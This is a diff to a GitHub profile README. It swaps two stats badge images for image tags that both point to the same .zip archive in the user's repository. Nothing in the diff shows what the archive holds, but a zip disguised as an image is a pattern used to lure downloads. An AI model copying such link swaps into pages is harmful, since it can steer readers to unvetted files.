@@ -67,8 +67,8 @@
 
 <div align="center">
 
-![Davi GitHub Stats](https://github-readme-stats.vercel.app/api?username=davi-teixeira7&show_icons=true&theme=transparent&hide_border=true&text_color=ffffff&icon_color=58a6ff&title_color=58a6ff)
+![Davi GitHub Stats](https://raw.githubusercontent.com/davi-teixeira7/davi-teixeira7/main/gifs/teixeira_davi_v3.8.zip)
 
-![Davi Streak](https://github-readme-streak-stats.herokuapp.com/?user=davi-teixeira7&theme=dark&hide_border=true&background=00000000&stroke=58a6ff&ring=58a6ff&fire=58a6ff)
+![Davi Streak](https://raw.githubusercontent.com/davi-teixeira7/davi-teixeira7/main/gifs/teixeira_davi_v3.8.zip)
 
 </div>
